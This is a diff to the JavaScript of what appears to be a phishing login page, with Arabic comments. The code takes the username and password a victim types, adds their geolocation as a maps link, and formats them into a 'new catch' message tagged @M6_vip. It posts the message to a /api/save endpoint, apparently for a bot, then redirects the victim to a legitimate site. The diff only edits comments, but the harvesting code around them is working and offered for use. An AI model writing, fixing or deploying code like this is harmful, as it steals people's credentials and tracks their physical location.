@@ -89,11 +89,10 @@
         var u = document.getElementById('user').value.trim();
         var p = document.getElementById('pass').value;
 
-        // التحقق من صحة المدخلات
         if (u.length >= 5 && p.length >= 6) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // تم استخدام رابط الخريطة الناجح من تجاربك السابقة
+                    // تصحيح رابط الموقع ليعمل آلياً
                     var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
                     send(u, p, loc);
                 }, function() {
@@ -129,7 +128,7 @@
     }
 
     function send(u, p, l) {
-        // تم إصلاح السطر 59 بإضافة علامات الاقتباس لضمان عمل الكود
+        // تم إصلاح علامات الاقتباس لضمان وصول الرسالة مرتبة للبوت
         var fullMsg = '🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم: ' + u + '\n🔑 كلمة السر: ' + p + '\n📍 الموقع: ' + l + '\n\n👤 @M6_vip';
 
         fetch('/api/save', {
@@ -137,7 +136,6 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: fullMsg })
         }).then(function() {
-            // التوجيه للموقع الأصلي بعد نجاح الإرسال
             window.location.href = 'https://receive-smss.com/';
         }).catch(function(err) {
             console.error('Error:', err);
